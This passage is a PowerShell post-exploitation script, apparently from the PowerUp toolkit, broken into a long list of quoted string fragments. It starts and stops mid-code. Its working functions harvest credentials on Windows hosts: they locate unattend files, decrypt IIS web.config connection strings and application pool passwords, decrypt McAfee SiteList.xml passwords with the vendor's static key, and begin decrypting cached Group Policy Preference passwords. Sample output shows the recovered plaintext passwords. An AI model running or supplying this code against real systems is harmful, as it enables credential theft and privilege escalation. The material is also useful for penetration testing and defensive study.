    }
   ',' $ErrorActio','nPreference ','= $OrigError','
}


functio','n Get-Unatte','ndedInstallF','ile {
<#
.SY','NOPSIS

Chec','ks several l','ocations for',' remaining u','nattended in','stallation f','iles,
which ','may have dep','loyment cred','entials.

Au','thor: Will S','chroeder (@h','armj0y)  
Li','cense: BSD 3','-Clause  
Re','quired Depen','dencies: Non','e  

.EXAMPL','E

Get-Unatt','endedInstall','File

Finds ','any remainin','g unattended',' installatio','n files.

.L','INK

http://','www.fuzzysec','urity.com/tu','torials/16.h','tml

.OUTPUT','S

PowerUp.U','nattendedIns','tallFile

Cu','stom PSObjec','t containing',' results.
#>','

    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ',' [OutputType','(''PowerUp.Un','attendedInst','allFile'')]
 ','   [CmdletBi','nding()]
   ',' Param()

  ','  $OrigError',' = $ErrorAct','ionPreferenc','e
    $Error','ActionPrefer','ence = "Sile','ntlyContinue','"

    $Sear','chLocations ','= @(   "c:\s','ysprep\syspr','ep.xml",
   ','            ','            ',' "c:\sysprep','\sysprep.inf','",
         ','            ','       "c:\s','ysprep.inf",','
           ','            ','     (Join-P','ath $Env:Win','Dir "\Panthe','r\Unattended','.xml"),
    ','            ','            ','(Join-Path $','Env:WinDir "','\Panther\Una','ttend\Unatte','nded.xml"),
','            ','            ','    (Join-Pa','th $Env:WinD','ir "\Panther','\Unattend.xm','l"),
       ','            ','         (Jo','in-Path $Env',':WinDir "\Pa','nther\Unatte','nd\Unattend.','xml"),
     ','            ','           (','Join-Path $E','nv:WinDir "\','System32\Sys','prep\unatten','d.xml"),
   ','            ','            ',' (Join-Path ','$Env:WinDir ','"\System32\S','ysprep\Panth','er\unattend.','xml")
      ','            ','      )

   ',' # test the ','existence of',' each path a','nd return an','ything found','
    $Search','Locations | ','Where-Object',' { Test-Path',' $_ } | ForE','ach-Object {','
        $Ou','t = New-Obje','ct PSObject
','        $Out',' | Add-Membe','r Noteproper','ty ''Unattend','Path'' $_
   ','     $Out | ','Add-Member A','liasproperty',' Name Unatte','ndPath
     ','   $Out.PSOb','ject.TypeNam','es.Insert(0,',' ''PowerUp.Un','attendedInst','allFile'')
  ','      $Out
 ','   }

    $E','rrorActionPr','eference = $','OrigError
}
','

function G','et-WebConfig',' {
<#
.SYNOP','SIS

This sc','ript will re','cover cleart','ext and encr','ypted connec','tion strings',' from all we','b.config
fil','es on the sy','stem. Also, ','it will decr','ypt them if ','needed.

Aut','hor: Scott S','utherland, A','ntti Rantasa','ari  
Licens','e: BSD 3-Cla','use  
Requir','ed Dependenc','ies: None  
','
.DESCRIPTIO','N

This scri','pt will iden','tify all of ','the web.conf','ig files on ','the system a','nd recover t','he
connectio','n strings us','ed to suppor','t authentica','tion to back','end database','s.  If neede','d, the
scrip','t will also ','decrypt the ','connection s','trings on th','e fly.  The ','output suppo','rts the
pipe','line which c','an be used t','o convert al','l of the res','ults into a ','pretty table',' by piping
t','o format-tab','le.

.EXAMPL','E

Return a ','list of clea','rtext and de','crypted conn','ect strings ','from web.con','fig files.

','Get-WebConfi','g

user   : ','s1admin
pass','   : s1passw','ord
dbserv :',' 192.168.1.1','03\server1
v','dir   : C:\t','est2
path   ',': C:\test2\w','eb.config
en','cr   : No

u','ser   : s1us','er
pass   : ','s1password
d','bserv : 192.','168.1.103\se','rver1
vdir  ',' : C:\inetpu','b\wwwroot
pa','th   : C:\in','etpub\wwwroo','t\web.config','
encr   : Ye','s

.EXAMPLE
','
Return a li','st of clear ','text and dec','rypted conne','ct strings f','rom web.conf','ig files.

G','et-WebConfig',' | Format-Ta','ble -Autosiz','e

user    p','ass       db','serv        ','        vdir','            ','   path     ','            ','         enc','r
----    --','--       ---','---         ','       ---- ','            ','  ----      ','            ','        ----','
s1admin s1p','assword 192.','168.1.101\se','rver1 C:\App','1           ',' C:\App1\web','.config     ','       No
s1','user  s1pass','word 192.168','.1.101\serve','r1 C:\inetpu','b\wwwroot C:','\inetpub\www','root\web.con','fig No
s2use','r  s2passwor','d 192.168.1.','102\server2 ','C:\App2     ','       C:\Ap','p2\test\web.','config      ',' No
s2user  ','s2password 1','92.168.1.102','\server2 C:\','App2        ','    C:\App2\','web.config  ','          Ye','s
s3user  s3','password 192','.168.1.103\s','erver3 D:\Ap','p3          ','  D:\App3\we','b.config    ','        No

','.OUTPUTS

Sy','stem.Boolean','

System.Dat','a.DataTable
','
.LINK

http','s://github.c','om/darkopera','tor/Posh-Sec','Mod/blob/mas','ter/PostExpl','oitation/Pos','tExploitatio','n.psm1
http:','//www.netspi','.com
https:/','/raw2.github','.com/NetSPI/','cmdsql/maste','r/cmdsql.asp','x
http://www','.iis.net/lea','rn/get-start','ed/getting-s','tarted-with-','iis/getting-','started-with','-appcmdexe
h','ttp://msdn.m','icrosoft.com','/en-us/libra','ry/k6h9cz8h(','v=vs.80).asp','x

.NOTES

B','elow is an a','lterantive m','ethod for gr','abbing conne','ction string','s, but it do','esn''t suppor','t decryption','.
for /f "to','kens=*" %i i','n (''%systemr','oot%\system3','2\inetsrv\ap','pcmd.exe lis','t sites /tex','t:name'') do ','%systemroot%','\system32\in','etsrv\appcmd','.exe list co','nfig "%i" -s','ection:conne','ctionstrings','

Author: Sc','ott Sutherla','nd - 2014, N','etSPI
Author',': Antti Rant','asaari - 201','4, NetSPI
#>','

    [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSAvoid','UsingInvokeE','xpression'', ',''''')]
    [Ou','tputType(''Sy','stem.Boolean',''')]
    [Out','putType(''Sys','tem.Data.Dat','aTable'')]
  ','  [CmdletBin','ding()]
    ','Param()

   ',' $OrigError ','= $ErrorActi','onPreference','
    $ErrorA','ctionPrefere','nce = ''Silen','tlyContinue''','

    # Chec','k if appcmd.','exe exists
 ','   if (Test-','Path  ("$Env',':SystemRoot\','System32\Ine','tSRV\appcmd.','exe")) {

  ','      # Crea','te data tabl','e to house r','esults
     ','   $DataTabl','e = New-Obje','ct System.Da','ta.DataTable','

        # ','Create and n','ame columns ','in the data ','table
      ','  $Null = $D','ataTable.Col','umns.Add(''us','er'')
       ',' $Null = $Da','taTable.Colu','mns.Add(''pas','s'')
        ','$Null = $Dat','aTable.Colum','ns.Add(''dbse','rv'')
       ',' $Null = $Da','taTable.Colu','mns.Add(''vdi','r'')
        ','$Null = $Dat','aTable.Colum','ns.Add(''path',''')
        $','Null = $Data','Table.Column','s.Add(''encr''',')

        #',' Get list of',' virtual dir','ectories in ','IIS
        ','C:\Windows\S','ystem32\Inet','SRV\appcmd.e','xe list vdir',' /text:physi','calpath |
  ','      ForEac','h-Object {

','            ','$CurrentVdir',' = $_

     ','       # Con','verts CMD st','yle env vars',' (%) to powe','rshell env v','ars (env)
  ','          if',' ($_ -like "','*%*") {
    ','            ','$EnvarName =',' "`$Env:"+$_','.split("%")[','1]
         ','       $Enva','rValue = Inv','oke-Expressi','on $EnvarNam','e
          ','      $Resto','fPath = $_.s','plit(''%'')[2]','
           ','     $Curren','tVdir  = $En','varValue+$Re','stofPath
   ','         }

','            ','# Search for',' web.config ','files in eac','h virtual di','rectory
    ','        $Cur','rentVdir | G','et-ChildItem',' -Recurse -F','ilter web.co','nfig | ForEa','ch-Object {
','
           ','     # Set w','eb.config pa','th
         ','       $Curr','entPath = $_','.fullname

 ','            ','   # Read th','e data from ','the web.conf','ig xml file
','            ','    [xml]$Co','nfigFile = G','et-Content $','_.fullname

','            ','    # Check ','if the conne','ctionStrings',' are encrypt','ed
         ','       if ($','ConfigFile.c','onfiguration','.connectionS','trings.add) ','{

         ','           #',' Foreach con','nection stri','ng add to da','ta table
   ','            ','     $Config','File.configu','ration.conne','ctionStrings','.add|
      ','            ','  ForEach-Ob','ject {

    ','            ','        [Str','ing]$MyConSt','ring = $_.co','nnectionStri','ng
         ','            ','   if ($MyCo','nString -lik','e ''*password','*'') {
      ','            ','          $C','onfUser = $M','yConString.S','plit(''='')[3]','.Split('';'')[','0]
         ','            ','       $Conf','Pass = $MyCo','nString.Spli','t(''='')[4].Sp','lit('';'')[0]
','            ','            ','    $ConfSer','v = $MyConSt','ring.Split(''','='')[1].Split','('';'')[0]
   ','            ','            ',' $ConfVdir =',' $CurrentVdi','r
          ','            ','      $ConfE','nc = ''No''
  ','            ','            ','  $Null = $D','ataTable.Row','s.Add($ConfU','ser, $ConfPa','ss, $ConfSer','v, $ConfVdir',', $CurrentPa','th, $ConfEnc',')
          ','            ','  }
        ','            ','}
          ','      }
    ','            ','else {

    ','            ','    # Find n','ewest versio','n of aspnet_','regiis.exe t','o use (it wo','rks with old','er versions)','
           ','         $As','pnetRegiisPa','th = Get-Chi','ldItem -Path',' "$Env:Syste','mRoot\Micros','oft.NET\Fram','ework\" -Rec','urse -filter',' ''aspnet_reg','iis.exe''  | ','Sort-Object ','-Descending ','| Select-Obj','ect fullname',' -First 1

 ','            ','       # Che','ck if aspnet','_regiis.exe ','exists
     ','            ','   if (Test-','Path  ($Aspn','etRegiisPath','.FullName)) ','{

         ','            ','   # Setup p','ath for temp',' web.config ','to the curre','nt user''s te','mp dir
     ','            ','       $WebC','onfigPath = ','(Get-Item $E','nv:temp).Ful','lName + ''\we','b.config''

 ','            ','           #',' Remove exis','ting temp we','b.config
   ','            ','         if ','(Test-Path  ','($WebConfigP','ath)) {
    ','            ','            ','Remove-Item ','$WebConfigPa','th
         ','            ','   }

      ','            ','      # Copy',' web.config ','from vdir to',' user temp f','or decryptio','n
          ','            ','  Copy-Item ','$CurrentPath',' $WebConfigP','ath

       ','            ','     # Decry','pt web.confi','g in user te','mp
         ','            ','   $AspnetRe','giisCmd = $A','spnetRegiisP','ath.fullname','+'' -pdf "con','nectionStrin','gs" (get-ite','m $Env:temp)','.FullName''
 ','            ','           $','Null = Invok','e-Expression',' $AspnetRegi','isCmd

     ','            ','       # Rea','d the data f','rom the web.','config in te','mp
         ','            ','   [xml]$TMP','ConfigFile =',' Get-Content',' $WebConfigP','ath

       ','            ','     # Check',' if the conn','ectionString','s are still ','encrypted
  ','            ','          if',' ($TMPConfig','File.configu','ration.conne','ctionStrings','.add) {

   ','            ','            ',' # Foreach c','onnection st','ring add to ','data table
 ','            ','            ','   $TMPConfi','gFile.config','uration.conn','ectionString','s.add | ForE','ach-Object {','

          ','            ','          [S','tring]$MyCon','String = $_.','connectionSt','ring
       ','            ','            ',' if ($MyConS','tring -like ','''*password*''',') {
        ','            ','            ','    $ConfUse','r = $MyConSt','ring.Split(''','='')[3].Split','('';'')[0]
   ','            ','            ','         $Co','nfPass = $My','ConString.Sp','lit(''='')[4].','Split('';'')[0',']
          ','            ','            ','  $ConfServ ','= $MyConStri','ng.Split(''=''',')[1].Split(''',';'')[0]
     ','            ','            ','       $Conf','Vdir = $Curr','entVdir
    ','            ','            ','        $Con','fEnc = ''Yes''','
           ','            ','            ',' $Null = $Da','taTable.Rows','.Add($ConfUs','er, $ConfPas','s, $ConfServ',', $ConfVdir,',' $CurrentPat','h, $ConfEnc)','
           ','            ','         }
 ','            ','            ','   }
       ','            ','     }
     ','            ','       else ','{
          ','            ','      Write-','Verbose "Dec','ryption of $','CurrentPath ','failed."
   ','            ','            ',' $False
    ','            ','        }
  ','            ','      }
    ','            ','    else {
 ','            ','           W','rite-Verbose',' ''aspnet_reg','iis.exe does',' not exist i','n the defaul','t location.''','
           ','            ',' $False
    ','            ','    }
      ','          }
','            ','}
        }
','
        # C','heck if any ','connection s','trings were ','found
      ','  if ( $Data','Table.rows.C','ount -gt 0 )',' {
         ','   # Display',' results in ','list view th','at can feed ','into the pip','eline
      ','      $DataT','able | Sort-','Object user,','pass,dbserv,','vdir,path,en','cr | Select-','Object user,','pass,dbserv,','vdir,path,en','cr -Unique
 ','       }
   ','     else {
','            ','Write-Verbos','e ''No connec','tion strings',' found.''
   ','         $Fa','lse
        ','}
    }
    ','else {
     ','   Write-Ver','bose ''Appcmd','.exe does no','t exist in t','he default l','ocation.''
  ','      $False','
    }
    $','ErrorActionP','reference = ','$OrigError
}','


function ','Get-Applicat','ionHost {
<#','
.SYNOPSIS

','Recovers enc','rypted appli','cation pool ','and virtual ','directory pa','sswords from',' the applica','tionHost.con','fig on the s','ystem.

Auth','or: Scott Su','therland  
L','icense: BSD ','3-Clause  
R','equired Depe','ndencies: No','ne  

.DESCR','IPTION

This',' script will',' decrypt and',' recover app','lication poo','l and virtua','l directory ','passwords
fr','om the appli','cationHost.c','onfig file o','n the system','.  The outpu','t supports t','he
pipeline ','which can be',' used to con','vert all of ','the results ','into a prett','y table by p','iping
to for','mat-table.

','.EXAMPLE

Re','turn applica','tion pool an','d virtual di','rectory pass','words from t','he applicati','onHost.confi','g on the sys','tem.

Get-Ap','plicationHos','t

user    :',' PoolUser1
p','ass    : Poo','lParty1!
typ','e    : Appli','cation Pool
','vdir    : NA','
apppool : A','pplicationPo','ol1
user    ',': PoolUser2
','pass    : Po','olParty2!
ty','pe    : Appl','ication Pool','
vdir    : N','A
apppool : ','ApplicationP','ool2
user   ',' : VdirUser1','
pass    : V','dirPassword1','!
type    : ','Virtual Dire','ctory
vdir  ','  : site1/vd','ir1/
apppool',' : NA
user  ','  : VdirUser','2
pass    : ','VdirPassword','2!
type    :',' Virtual Dir','ectory
vdir ','   : site2/
','apppool : NA','

.EXAMPLE

','Return a lis','t of clearte','xt and decry','pted connect',' strings fro','m web.config',' files.

Get','-Application','Host | Forma','t-Table -Aut','osize

user ','         pas','s           ','    type    ','          vd','ir         a','pppool
---- ','         ---','-           ','    ----    ','          --','--         -','------
PoolU','ser1     Poo','lParty1!    ','   Applicati','on Pool   NA','           A','pplicationPo','ol1
PoolUser','2     PoolPa','rty2!       ','Application ','Pool   NA   ','        Appl','icationPool2','
VdirUser1  ','   VdirPassw','ord1!    Vir','tual Directo','ry  site1/vd','ir1/ NA
Vdir','User2     Vd','irPassword2!','    Virtual ','Directory  s','ite2/       ','NA

.OUTPUTS','

System.Dat','a.DataTable
','
System.Bool','ean

.LINK

','https://gith','ub.com/darko','perator/Posh','-SecMod/blob','/master/Post','Exploitation','/PostExploit','ation.psm1
h','ttp://www.ne','tspi.com
htt','p://www.iis.','net/learn/ge','t-started/ge','tting-starte','d-with-iis/g','etting-start','ed-with-appc','mdexe
http:/','/msdn.micros','oft.com/en-u','s/library/k6','h9cz8h(v=vs.','80).aspx

.N','OTES

Author',': Scott Suth','erland - 201','4, NetSPI
Ve','rsion: Get-A','pplicationHo','st v1.0
Comm','ents: Should',' work on IIS',' 6 and Above','
#>

    [Di','agnostics.Co','deAnalysis.S','uppressMessa','geAttribute(','''PSShouldPro','cess'', '''')]
','    [Diagnos','tics.CodeAna','lysis.Suppre','ssMessageAtt','ribute(''PSAv','oidUsingInvo','keExpression',''', '''')]
    ','[OutputType(','''System.Data','.DataTable'')',']
    [Outpu','tType(''Syste','m.Boolean'')]','
    [Cmdlet','Binding()]
 ','   Param()

','    $OrigErr','or = $ErrorA','ctionPrefere','nce
    $Err','orActionPref','erence = ''Si','lentlyContin','ue''

    # C','heck if appc','md.exe exist','s
    if (Te','st-Path  ("$','Env:SystemRo','ot\System32\','inetsrv\appc','md.exe")) {
','        # Cr','eate data ta','ble to house',' results
   ','     $DataTa','ble = New-Ob','ject System.','Data.DataTab','le

        ','# Create and',' name column','s in the dat','a table
    ','    $Null = ','$DataTable.C','olumns.Add(''','user'')
     ','   $Null = $','DataTable.Co','lumns.Add(''p','ass'')
      ','  $Null = $D','ataTable.Col','umns.Add(''ty','pe'')
       ',' $Null = $Da','taTable.Colu','mns.Add(''vdi','r'')
        ','$Null = $Dat','aTable.Colum','ns.Add(''appp','ool'')

     ','   # Get lis','t of applica','tion pools
 ','       Invok','e-Expression',' "$Env:Syste','mRoot\System','32\inetsrv\a','ppcmd.exe li','st apppools ','/text:name" ','| ForEach-Ob','ject {

    ','        # Ge','t applicatio','n pool name
','            ','$PoolName = ','$_

        ','    # Get us','ername
     ','       $Pool','UserCmd = "$','Env:SystemRo','ot\System32\','inetsrv\appc','md.exe list ','apppool " + ','"`"$PoolName','`" /text:pro','cessmodel.us','ername"
    ','        $Poo','lUser = Invo','ke-Expressio','n $PoolUserC','md

        ','    # Get pa','ssword
     ','       $Pool','PasswordCmd ','= "$Env:Syst','emRoot\Syste','m32\inetsrv\','appcmd.exe l','ist apppool ','" + "`"$Pool','Name`" /text',':processmode','l.password"
','            ','$PoolPasswor','d = Invoke-E','xpression $P','oolPasswordC','md

        ','    # Check ','if credentia','ls exists
  ','          if',' (($PoolPass','word -ne "")',' -and ($Pool','Password -is','not [system.','array])) {
 ','            ','   # Add cre','dentials to ','database
   ','            ',' $Null = $Da','taTable.Rows','.Add($PoolUs','er, $PoolPas','sword,''Appli','cation Pool''',',''NA'',$PoolN','ame)
       ','     }
     ','   }

      ','  # Get list',' of virtual ','directories
','        Invo','ke-Expressio','n "$Env:Syst','emRoot\Syste','m32\inetsrv\','appcmd.exe l','ist vdir /te','xt:vdir.name','" | ForEach-','Object {

  ','          # ','Get Virtual ','Directory Na','me
         ','   $VdirName',' = $_

     ','       # Get',' username
  ','          $V','dirUserCmd =',' "$Env:Syste','mRoot\System','32\inetsrv\a','ppcmd.exe li','st vdir " + ','"`"$VdirName','`" /text:use','rName"
     ','       $Vdir','User = Invok','e-Expression',' $VdirUserCm','d

         ','   # Get pas','sword
      ','      $VdirP','asswordCmd =',' "$Env:Syste','mRoot\System','32\inetsrv\a','ppcmd.exe li','st vdir " + ','"`"$VdirName','`" /text:pas','sword"
     ','       $Vdir','Password = I','nvoke-Expres','sion $VdirPa','sswordCmd

 ','           #',' Check if cr','edentials ex','ists
       ','     if (($V','dirPassword ','-ne "") -and',' ($VdirPassw','ord -isnot [','system.array','])) {
      ','          # ','Add credenti','als to datab','ase
        ','        $Nul','l = $DataTab','le.Rows.Add(','$VdirUser, $','VdirPassword',',''Virtual Di','rectory'',$Vd','irName,''NA'')','
           ',' }
        }','

        # ','Check if any',' passwords w','ere found
  ','      if ( $','DataTable.ro','ws.Count -gt',' 0 ) {
     ','       # Dis','play results',' in list vie','w that can f','eed into the',' pipeline
  ','          $D','ataTable |  ','Sort-Object ','type,user,pa','ss,vdir,appp','ool | Select','-Object user',',pass,type,v','dir,apppool ','-Unique
    ','    }
      ','  else {
   ','         # S','tatus user
 ','           W','rite-Verbose',' ''No applica','tion pool or',' virtual dir','ectory passw','ords were fo','und.''
      ','      $False','
        }
 ','   }
    els','e {
        ','Write-Verbos','e ''Appcmd.ex','e does not e','xist in the ','default loca','tion.''
     ','   $False
  ','  }
    $Err','orActionPref','erence = $Or','igError
}


','function Get','-SiteListPas','sword {
<#
.','SYNOPSIS

Re','trieves the ','plaintext pa','sswords for ','found McAfee','''s SiteList.','xml files.
B','ased on Jero','me Nokin (@f','unoverip)''s ','Python solut','ion (in link','s).

Author:',' Jerome Noki','n (@funoveri','p)  
PowerSh','ell Port: @h','armj0y  
Lic','ense: BSD 3-','Clause  
Req','uired Depend','encies: None','  

.DESCRIP','TION

Search','es for any M','cAfee SiteLi','st.xml in C:','\Program Fil','es\, C:\Prog','ram Files (x','86)\,
C:\Doc','uments and S','ettings\, or',' C:\Users\. ','For any file','s found, the',' appropriate','
credential ','fields are e','xtracted and',' decrypted u','sing the int','ernal Get-De','cryptedSitel','istPassword
','function tha','t takes adva','ntage of McA','fee''s static',' key encrypt','ion. Any dec','rypted crede','ntials
are o','utput in cus','tom objects.',' See links f','or more info','rmation.

.P','ARAMETER Pat','h

Optional ','path to a Si','teList.xml f','ile or folde','r.

.EXAMPLE','

Get-SiteLi','stPassword

','EncPassword ',': jWbTyS7BL1','Hj7PkO5Di/Qh','hYmcGj5cOoZ2','OkDTrFXsR/ab','AFPM9B3Q==
U','serName    :','
Path       ',' : Products/','CommonUpdate','r
Name      ','  : McAfeeHt','tp
DecPasswo','rd : MyStron','gPassword!
E','nabled     :',' 1
DomainNam','e  :
Server ','     : updat','e.nai.com:80','

EncPasswor','d : jWbTyS7B','L1Hj7PkO5Di/','QhhYmcGj5cOo','Z2OkDTrFXsR/','abAFPM9B3Q==','
UserName   ',' : McAfeeSer','vice
Path   ','     : Repos','itory$
Name ','       : Par','is
DecPasswo','rd : MyStron','gPassword!
E','nabled     :',' 1
DomainNam','e  : company','domain
Serve','r      : par','is001

EncPa','ssword : jWb','TyS7BL1Hj7Pk','O5Di/QhhYmcG','j5cOoZ2OkDTr','FXsR/abAFPM9','B3Q==
UserNa','me    : McAf','eeService
Pa','th        : ','Repository$
','Name        ',': Tokyo
DecP','assword : My','StrongPasswo','rd!
Enabled ','    : 1
Doma','inName  : co','mpanydomain
','Server      ',': tokyo000

','.OUTPUTS

Po','werUp.SiteLi','stPassword

','.LINK

https','://github.co','m/funoverip/','mcafee-sitel','ist-pwd-decr','yption/
http','s://funoveri','p.net/2016/0','2/mcafee-sit','elist-xml-pa','ssword-decry','ption/
https','://github.co','m/tfairane/H','ackStory/blo','b/master/McA','feePrivesc.m','d
https://ww','w.syss.de/fi','leadmin/doku','mente/Publik','ationen/2011','/SySS_2011_D','eeg_Privileg','e_Escalation','_via_Antivir','us_Software.','pdf
#>

    ','[Diagnostics','.CodeAnalysi','s.SuppressMe','ssageAttribu','te(''PSShould','Process'', ''''',')]
    [Outp','utType(''Powe','rUp.SiteList','Password'')]
','    [CmdletB','inding()]
  ','  Param(
   ','     [Parame','ter(Position',' = 0, ValueF','romPipeline ','= $True)]
  ','      [Valid','ateScript({T','est-Path -Pa','th $_ })]
  ','      [Strin','g[]]
       ',' $Path
    )','

    BEGIN ','{
        fu','nction Local',':Get-Decrypt','edSitelistPa','ssword {
   ','         # P','owerShell ad','aptation of ','https://gith','ub.com/funov','erip/mcafee-','sitelist-pwd','-decryption/','
           ',' # Original ','Author: Jero','me Nokin (@f','unoverip / j','erome.nokin@','gmail.com)
 ','           #',' port by @ha','rmj0y
      ','      [Diagn','ostics.CodeA','nalysis.Supp','ressMessageA','ttribute(''PS','ShouldProces','s'', '''')]
   ','         [Cm','dletBinding(',')]
         ','   Param(
  ','            ','  [Parameter','(Mandatory =',' $True)]
   ','            ',' [String]
  ','            ','  $B64Pass
 ','           )','

          ','  # make sur','e the approp','riate assemb','lies are loa','ded
        ','    Add-Type',' -Assembly S','ystem.Securi','ty
         ','   Add-Type ','-Assembly Sy','stem.Core

 ','           #',' declare the',' encoding/cr','ypto provide','rs we need
 ','           $','Encoding = [','System.Text.','Encoding]::A','SCII
       ','     $SHA1 =',' New-Object ','System.Secur','ity.Cryptogr','aphy.SHA1Cry','ptoServicePr','ovider
     ','       $3DES',' = New-Objec','t System.Sec','urity.Crypto','graphy.Tripl','eDESCryptoSe','rviceProvide','r

         ','   # static ','McAfee key X','OR key LOL
 ','           $','XORKey = 0x1','2,0x15,0x0F,','0x10,0x11,0x','1C,0x1A,0x06',',0x0A,0x1F,0','x1B,0x18,0x1','7,0x16,0x05,','0x19

      ','      # xor ','the input b6','4 string wit','h the static',' XOR key
   ','         $I ','= 0;
       ','     $UnXore','d = [System.','Convert]::Fr','omBase64Stri','ng($B64Pass)',' | Foreach-O','bject { $_ -','BXor $XORKey','[$I++ % $XOR','Key.Length] ','}

         ','   # build t','he static Mc','Afee 3DES ke','y TROLOL
   ','         $3D','ESKey = $SHA','1.ComputeHas','h($Encoding.','GetBytes(''<!','@#$%^>'')) + ',',0x00*4

   ','         # s','et the optio','ns we need
 ','           $','3DES.Mode = ','''ECB''
      ','      $3DES.','Padding = ''N','one''
       ','     $3DES.K','ey = $3DESKe','y

         ','   # decrypt',' the unXor''e','d block
    ','        $Dec','rypted = $3D','ES.CreateDec','ryptor().Tra','nsformFinalB','lock($UnXore','d, 0, $UnXor','ed.Length)

','            ','# ignore the',' padding for',' the result
','            ','$Index = [Ar','ray]::IndexO','f($Decrypted',', [Byte]0)
 ','           i','f ($Index -n','e -1) {
    ','            ','$DecryptedPa','ss = $Encodi','ng.GetString','($Decrypted[','0..($Index-1',')])
        ','    }
      ','      else {','
           ','     $Decryp','tedPass = $E','ncoding.GetS','tring($Decry','pted)
      ','      }

   ','         New','-Object -Typ','eName PSObje','ct -Property',' @{''Encrypte','d''=$B64Pass;','''Decrypted''=','$DecryptedPa','ss}
        ','}

        f','unction Loca','l:Get-Siteli','stField {
  ','          [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSShouldPr','ocess'', '''')]','
           ',' [CmdletBind','ing()]
     ','       Param','(
          ','      [Param','eter(Mandato','ry = $True)]','
           ','     [String',']
          ','      $Path
','            ',')

         ','   try {
   ','            ',' [Xml]$SiteL','istXml = Get','-Content -Pa','th $Path

  ','            ','  if ($SiteL','istXml.Inner','Xml -Like "*','password*") ','{
          ','          Wr','ite-Verbose ','"Potential p','assword in f','ound in $Pat','h"

        ','            ','$SiteListXml','.SiteLists.S','iteList.Chil','dNodes | For','each-Object ','{
          ','            ','  try {
    ','            ','            ','$PasswordRaw',' = $_.Passwo','rd.''#Text''

','            ','            ','    if ($_.P','assword.Encr','ypted -eq 1)',' {
         ','            ','           #',' decrypt the',' base64 pass','word if it''s',' marked as e','ncrypted
   ','            ','            ','     $DecPas','sword = if (','$PasswordRaw',') { (Get-Dec','ryptedSiteli','stPassword -','B64Pass $Pas','swordRaw).De','crypted } el','se {''''}
    ','            ','            ','}
          ','            ','      else {','
           ','            ','         $De','cPassword = ','$PasswordRaw','
           ','            ','     }

    ','            ','            ','$Server = if',' ($_.ServerI','P) { $_.Serv','erIP } else ','{ $_.Server ','}
          ','            ','      $Path ','= if ($_.Sha','reName) { $_','.ShareName }',' else { $_.R','elativePath ','}

         ','            ','       $Obje','ctProperties',' = @{
      ','            ','            ','  ''Name'' = $','_.Name;
    ','            ','            ','    ''Enabled',''' = $_.Enabl','ed;
        ','            ','            ','''Server'' = $','Server;
    ','            ','            ','    ''Path'' =',' $Path;
    ','            ','            ','    ''DomainN','ame'' = $_.Do','mainName;
  ','            ','            ','      ''UserN','ame'' = $_.Us','erName;
    ','            ','            ','    ''EncPass','word'' = $Pas','swordRaw;
  ','            ','            ','      ''DecPa','ssword'' = $D','ecPassword;
','            ','            ','    }
      ','            ','          $O','ut = New-Obj','ect -TypeNam','e PSObject -','Property $Ob','jectProperti','es
         ','            ','       $Out.','PSObject.Typ','eNames.Inser','t(0, ''PowerU','p.SiteListPa','ssword'')
   ','            ','            ',' $Out
      ','            ','      }
    ','            ','        catc','h {
        ','            ','        Writ','e-Verbose "E','rror parsing',' node : $_"
','            ','            ','}
          ','          }
','            ','    }
      ','      }
    ','        catc','h {
        ','        Writ','e-Warning "E','rror parsing',' file ''$Path',''' : $_"
    ','        }
  ','      }
    ','}

    PROCE','SS {
       ',' if ($PSBoun','dParameters[','''Path'']) {
 ','           $','XmlFilePaths',' = $Path
   ','     }
     ','   else {
  ','          $X','mlFilePaths ','= @(''C:\Prog','ram Files\'',','''C:\Program ','Files (x86)\',''',''C:\Docume','nts and Sett','ings\'',''C:\U','sers\'')
    ','    }

     ','   $XmlFileP','aths | Forea','ch-Object { ','Get-ChildIte','m -Path $_ -','Recurse -Inc','lude ''SiteLi','st.xml'' -Err','orAction Sil','entlyContinu','e } | Where-','Object { $_ ','} | Foreach-','Object {
   ','         Wri','te-Verbose "','Parsing Site','List.xml fil','e ''$($_.Full','name)''"
    ','        Get-','SitelistFiel','d -Path $_.F','ullname
    ','    }
    }
','}


function',' Get-CachedG','PPPassword {','
<#
.SYNOPSI','S

Retrieves',' the plainte','xt password ','and other in','formation fo','r accounts p','ushed throug','h Group Poli','cy Preferenc','es and
left ','in cached fi','les on the h','ost.

Author',': Chris Camp','bell (@obscu','resec)  
Lic','ense: BSD 3-','Clause  
Req','uired Depend','encies: None','  

.DESCRIP','TION

Get-Ca','chedGPPPassw','ord searches',' the local m','achine for c','ached for gr','oups.xml, sc','heduledtasks','.xml, servic','es.xml and
d','atasources.x','ml files and',' returns pla','intext passw','ords.

.EXAM','PLE

Get-Cac','hedGPPPasswo','rd

NewName ','  : [BLANK]
','Changed   : ','{2013-04-25 ','18:36:07}
Pa','sswords : {S','uper!!!Passw','ord}
UserNam','es : {SuperS','ecretBackdoo','r}
File     ',' : C:\Progra','mData\Micros','oft\Group Po','licy\History','\{32C4C89F-7','
           ',' C3A-4227-A6','1D-8EF72B5B9','E42}\Machine','\Preferences','\Groups\Gr
 ','           o','ups.xml

.LI','NK

http://w','ww.obscurese','curity.blogs','pot.com/2012','/05/gpp-pass','word-retriev','al-with-powe','rshell.html
','https://gith','ub.com/matti','festation/Po','werSploit/bl','ob/master/Re','con/Get-GPPP','assword.ps1
','https://gith','ub.com/rapid','7/metasploit','-framework/b','lob/master/m','odules/post/','windows/gath','er/credentia','ls/gpp.rb
ht','tp://esec-pe','ntest.sogeti','.com/exploit','ing-windows-','2008-group-p','olicy-prefer','ences
http:/','/rewtdance.b','logspot.com/','2012/06/expl','oiting-windo','ws-2008-grou','p-policy.htm','l
#>

    [C','mdletBinding','()]
    Para','m()

    # S','ome XML issu','es between v','ersions
    ','Set-StrictMo','de -Version ','2

    # mak','e sure the a','ppropriate a','ssemblies ar','e loaded
   ',' Add-Type -A','ssembly Syst','em.Security
','    Add-Type',' -Assembly S','ystem.Core

','    # helper',' that decode','s and decryp','ts password
','    function',' local:Get-D','ecryptedCpas','sword {
    ','    [Diagnos','tics.CodeAna','lysis.Suppre','ssMessageAtt','ribute(''PSAv','oidUsingPlai','nTextForPass','word'', '''')]
','        [Cmd','letBinding()',']
        Pa','ram(
       ','     [string','] $Cpassword','
        )

','        try ','{
          ','  # Append a','ppropriate p','adding based',' on string l','ength
